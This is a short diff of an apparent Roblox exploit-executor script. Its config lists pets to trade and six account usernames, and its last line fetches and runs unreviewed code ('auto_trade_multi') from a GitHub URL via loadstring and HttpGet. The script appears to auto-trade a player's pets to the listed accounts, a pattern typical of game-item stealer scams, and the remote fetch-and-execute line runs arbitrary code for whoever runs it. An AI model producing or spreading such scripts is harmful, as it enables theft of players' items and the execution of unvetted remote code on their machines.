@@ -1,6 +1,6 @@
 getgenv().Config = {
     ["inventory"] = "pets",
-    ["usernames"] = {"username1", "username2", "username3"}, -- Boucle sur ces pseudos
+    ["usernames"] = {"PakuwonMallSBY","amouageofficial","sablesrose","akademicryptocom","ValerieAvrill","ValerieAvrills"},
     ["pets_to_trade"] = {"urban_2023_mongoose", "dog"}
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/auto_trade_multi"))()
